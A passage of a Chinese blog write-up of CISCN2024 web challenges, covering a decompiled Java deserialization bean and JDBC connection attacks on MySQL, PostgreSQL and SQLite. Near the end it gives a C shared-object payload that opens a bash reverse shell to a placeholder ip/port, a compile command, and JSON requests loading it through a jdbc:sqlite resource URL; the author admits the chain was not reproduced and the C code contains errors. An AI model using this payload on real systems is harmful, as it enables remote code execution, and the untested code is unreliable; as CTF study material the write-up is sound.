+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jdbctest.bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: app.jar:BOOT-INF/classes/com/example/jdbctest/bean/UserBean.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserBean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String age;</span><br><span class="line">    <span class="keyword">private</span> Object obj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserBean</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserBean</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObj</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setObj</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        HashMap&lt;String, <span class="type">byte</span>[]&gt; a = (HashMap) gf.get(<span class="string">&quot;obj&quot;</span>, (Object) <span class="literal">null</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) gf.get(<span class="string">&quot;name&quot;</span>, (Object) <span class="literal">null</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> (String) gf.get(<span class="string">&quot;age&quot;</span>, (Object) <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.obj = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            a.put(name, Base64.getDecoder().decode(age));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            var7.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>点进<code>this.datasourceServiceImpl.testDatasourceConnectionAble()</code>里，发现了三个sql的测试连接方法：</p>
+<img src="/posts/undefined/25.png" class title="awa">
+<p>先说结论，三个数据库我只测了mysql T_T，因为我只学了mysql的打法，然后测试的时候发现index页面会帮你传入这个jdbcBean了，就直接在post包里改url即可</p>
+<p>这是当时测的，mysql能打，但是没有反应，jdbc确实连到我的fake_mysql服务器上了：</p>
+<img src="/posts/undefined/26.png" class title="awa">
+<p>然后，然后就没有然后了。打不了反序列化</p>
+<p>pgsql没测，这里放一下y4神写的exp：</p>
+<p>[JavaSec/9.JDBC Attack/PostGreSQL/index.md at main · Y4tacker/JavaSec · GitHub](<a target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC">https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC</a> Attack/PostGreSQL/index.md)</p>
+<p>看了几眼，原理大概是</p>
+<p><code>DriverManager.getConnection</code>会导致在<code>org.postgresql.util.ObjectFactory#instantiate</code>可以初始化任意类，这里找到了<code>org.springframework.context.support.ClassPathXmlApplicationContext</code>，这个函数本来就是初始化spring配置的，这里可以解析远程xml配置文件实现RCE。似乎在这里也不行</p>
+<p>sqlite其实很鸡肋，只能做ssrf，但是这是在普通的情况下。如果开启了允许加载拓展的话，就能够加载恶意so文件打rce了()</p>
+<p>还是看看y4神的分析吧：</p>
+<p>[JavaSec/9.JDBC Attack/SQLite/index.md at main · Y4tacker/JavaSec · GitHub](<a target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC">https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC</a> Attack/SQLite/index.md)</p>
+<p>当sqllite建立连接是会调用<code>org.sqlite.core.CoreConnection#open</code></p>
+<img src="/posts/undefined/27.png" class title="awa">
+<p>这个时候进extractResource</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> File <span class="title function_">extractResource</span><span class="params">(URL resourceAddr)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (resourceAddr.getProtocol().equals(<span class="string">&quot;file&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(resourceAddr.toURI());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">dbFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>)).getAbsolutePath(), String.format(<span class="string">&quot;sqlite-jdbc-tmp-%d.db&quot;</span>, Integer.valueOf(resourceAddr.hashCode())));</span><br><span class="line">            <span class="keyword">if</span> (dbFile.exists()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (resourceAddr.openConnection().getLastModified() &lt; dbFile.lastModified()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> dbFile;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!dbFile.delete()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;failed to remove existing DB file: &quot;</span> + dbFile.getAbsolutePath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(dbFile);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">reader</span> <span class="operator">=</span> resourceAddr.openStream();</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> reader.read(buffer);</span><br><span class="line">                    <span class="keyword">if</span> (bytesRead == -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> dbFile;</span><br><span class="line">                    &#125;</span><br><span class="line">                    writer.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>简单看看这个流程，能够通过访问这个resourceAddr，然后能够将文件写进定义好的<code>java.io.tmpdir</code>目录，文件名叫<code>sqlite-jdbc-tmp-xxx.db</code>，xxx是resourceAddr的hash值，我们可以通过本地调试测出这个hash值</p>
+<img src="/posts/undefined/28.png" class title="awa">
+<img src="/posts/undefined/29.png" class title="awa">
+<p>这里的结果只和后面的exp.so有关系，这里改成</p>
+<p>所以说它会把文件缓存进/tmp，但是如果没有允许加载拓展的话，就只能做到这种地步了</p>
+<p>回到这里，看看SqliteDatasourceConnector：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">SqliteDatasourceConnector</span><span class="params">(String url)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);</span><br><span class="line">    <span class="type">SQLiteConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SQLiteConfig</span>();</span><br><span class="line">    config.enableLoadExtension(<span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">this</span>.connection = DriverManager.getConnection(url, config.toProperties());</span><br><span class="line">    <span class="built_in">this</span>.connection.setAutoCommit(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到他这里允许加载extension，此时就可以利用 <code>&quot;CREATE VIEW &quot;</code>将不可控的SELECT语句转换为可控。</p>
+<p>如果我们能够控制SELECT语句，我们可以使用<code>SELECT load_extension('/tmp/test.so')</code>来加载<code>dll/so</code>并执行恶意代码</p>
+<p>这里看以下su18师傅的<a target="_blank" rel="noopener" href="https://github.com/su18/JDBC-Attack/blob/main/sqlite-attack/src/main/java/org/su18/jdbc/attack/AttackSQLite.java">攻击示例</a>：</p>
+<img src="/posts/undefined/30.png" class title="awa">
+<p>可以看到还需要读一次表，而这个DataSourceConnector里面就有这个操作，而我们只需要写好表名即可</p>
+<img src="/posts/undefined/31.png" class title="awa">
+<h3><span id="payload怎么写的"> payload怎么写的</span></h3>
+<p><a target="_blank" rel="noopener" href="https://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/">Jdbc碎碎念三：内存数据库 | m0d9’s blog</a></p>
+<p>参考它可以先写一个恶意的so，<strong>类似</strong>下面这个形式<span class="blur">脑测太麻烦了，到时候更新正式wp的时候再改</span></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">    system(&#x27;bash -c &quot;bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>gcc编译成so：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC exp.c -o exp.so</span><br></pre></td></tr></table></figure>
+<p>写完so以后打一次请求(为什么用的是security，这个直接用的是现成的)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:3, &quot;url&quot;:&quot;jdbc:sqlite::resource:http://ip:port/exp.so&quot;, &quot;tableName&quot;:&quot;security&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>本地跑一下这个<code>jdbc:sqlite::resource:http://ip:port/exp.so</code>计算出hashCode，记住他重命名为了<code>sqlite-jdbc-tmp-xxx.db</code></p>
+<p>su18师傅有现成的poc.db，下下来用就行了，表名就是security，把里面的内容改一改。这里可以用navicat改，也貌似可以用010Editor改</p>
+<p>第二次请求打poc.db：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:3, &quot;url&quot;:&quot;jdbc:sqlite::resource:http://ip:port/poc.db&quot;, &quot;tableName&quot;:&quot;security&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>监听反弹的port，等shell弹过来即可，复现不了，等脑测</p>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/posts/26055.html",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/posts/26055.html";
+            const title         = "「CISCN2024 Web方向题解」";
+            const excerpt       = `被CISCN打烂了，几个题都是差一点就出，自己还是太菜了。顺带一提，怎么出题方有srk啊()`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2024-05-20T14:41:13.142Z" itemprop="dateModified">最后编辑：2024-05-20</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" 山警网络空间安全实验室比赛的复现学习" href="/posts/48037.html">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+        <div id="v-comments" class="post-comments bg-image"></div>
+<script>
+    var load_comm = () => {
+        const init = () => {
+            new Valine({
+                el: '#v-comments',
+                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
+                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
+                visitor: true,
+                enableQQ: false,
+                path: '/posts/26055.html'
+                
+            });
+        }
+        if (typeof Valine === 'undefined') {
+            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
+            $.getScript(src, init);
+        } else {
+            init();
+        }
+    };
+</script>
+
+
+<script>
+<style>
+    .v .veditor{min-height: 10rem;
+        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: none;}
+</style>
+</script>
+
+
+    <script>
+        new Valine({
+            el: '#vcomments',
+            lang: 'zh-cn',
+            admin_email: '83635877@qq.com',//博主邮箱
+            appId: "",
+            appKey: "",
+            path: window.location.pathname,
+            comment_count: true,
+            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
+            //verify: true, //验证码
+            avatar: 'monsterid',//小怪物头像
+            placeholder: "qwq~"
+        });
+        
+</script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script type="text/javascript">
+        jinrishici.load(function(result) {
+            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
+            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+        })
+    </script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>
+
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+        <script src="./js/src/Valine.min.js"></script>   
+        
+        
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/Oscar.jpg" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                59
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                11
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                13
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">15</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.6em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.67em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.67em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.7em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.6em;">awd</a> <a href="/tags/java/" style="font-size: 0.73em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.63em;">渗透</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/posts/26055.html"><i class="fa  fa-book"></i> CISCN2024 Web方向题解</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/48037.html"><i class="fa  fa-book"></i> 山警网络空间安全实验室比赛的复现学习</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/23430.html"><i class="fa  fa-book"></i> javaweb与tomcat</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/25574.html"><i class="fa  fa-book"></i> java内存马学习 - 介绍</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/4656.html"><i class="fa  fa-book"></i> Flask内存马学习</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/Err0r2333"><i class="fa fa-twitter"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2024 Err0r233 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                        <div id="binft"></div>
+  <script>
+    var binft = function (r) {
+      function t() {
+        return b[Math.floor(Math.random() * b.length)]
+      }  
+      function e() {
+        return String.fromCharCode(94 * Math.random() + 33)
+      }
+      function n(r) {
+        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+          var l = document.createElement("span");
+          l.textContent = e(), l.style.color = t(), n.appendChild(l)
+        }
+        return n
+      }
+      function i() {
+        var t = o[c.skillI];
+        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
+      }
+      var l = "",
+      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
+      return r + ""
+      }),
+      a = 2,
+      g = 1,
+      s = 5,
